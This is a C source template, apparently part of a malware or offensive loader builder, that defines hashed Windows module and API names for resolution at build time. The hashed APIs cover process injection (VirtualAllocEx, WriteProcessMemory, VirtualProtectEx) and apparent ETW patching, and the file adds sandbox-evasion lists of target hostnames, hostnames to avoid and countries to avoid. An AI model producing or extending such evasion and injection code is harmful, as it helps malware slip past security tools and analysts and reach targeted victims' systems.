#include "objhash.h"

// Function to check if an ObjHash is valid (non-null)
// An ObjHash is considered valid if any of its fields are non-zero.
bool is_objhash(ObjHash obj_hash) {
    // A null ObjHash is defined as {0, 0, false}
    return (obj_hash.value != 0 || obj_hash.rotation_value != 0 || obj_hash.is_rotation_right != false);
}

const ObjHash NTDLL_HASH = %__MODHASH__ntdll.dll__%;
const ObjHash USER32_HASH = %__MODHASH__user32.dll__%;
const ObjHash KERNEL32_HASH = %__MODHASH__kernel32.dll__%;

// Hashes for function names
const ObjHash LOAD_LIBRARY_HASH = %__FCTHASH__LoadLibraryA__%;
const ObjHash GET_PROC_ADDRESS_HASH = %__FCTHASH__GetProcAddress__%;
const ObjHash QUERY_INFORMATION_PROCESS_HASH = %__FCTHASH__NtQueryInformationProcess__%;

// Hashes for system information functions
const ObjHash GET_COMPUTER_NAME_HASH = %__FCTHASH__GetComputerNameA__%;
const ObjHash GET_DISK_FREE_SPACE_HASH = %__FCTHASH__GetDiskFreeSpaceExA__%;
const ObjHash GET_SYSTEM_INFO_HASH = %__FCTHASH__GetSystemInfo__%;
const ObjHash GET_KEYBOARD_LAYOUT_HASH = %__FCTHASH__GetKeyboardLayout__%;
const ObjHash GLOBAL_MEMORY_STATUS_HASH = %__FCTHASH__GlobalMemoryStatusEx__%;

// Hashes for language and locale functions
const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %__FCTHASH__GetSystemDefaultLangID__%;
const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %__FCTHASH__GetSystemDefaultLCID__%;

// Hashes for memory and thread management functions
const ObjHash VIRTUAL_ALLOC_HASH = %__FCTHASH__VirtualAllocEx__%;
const ObjHash WRITE_MEMORY_HASH = %__FCTHASH__WriteProcessMemory__%;
const ObjHash VIRTUAL_PROTECT_HASH = %__FCTHASH__VirtualProtectEx__%;

// ETW
const ObjHash ETW_EVENT_WRITE_HASH = %__FCTHASH__EtwEventWrite__%;
const ObjHash FLUSH_INSTRUCTION_CACHE_HASH = %__FCTHASH__FlushInstructionCache__%;

// statical arrays and sizes for avoided hostnames and countries
const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %__SANDBOX__TARGET_HOSTNAME__%;
const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
    %__SANDBOX__AVOID_HOSTNAME__%
};

// const ObjHash AVOIDED_CPU_NAME_HASHES[] = {
//     %__SANDBOX__AVOID_CPU_NAME__%
// };

// List of country codes to avoid
const uint16_t AVOIDED_COUNTRIES[] = {
    %__SANDBOX__AVOID_COUNTRIES__%
};

// Sizes of the avoided hostname and country arrays
const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE = sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]);
const size_t AVOIDED_COUNTRIES_SIZE = sizeof(AVOIDED_COUNTRIES) / sizeof(AVOIDED_COUNTRIES[0]);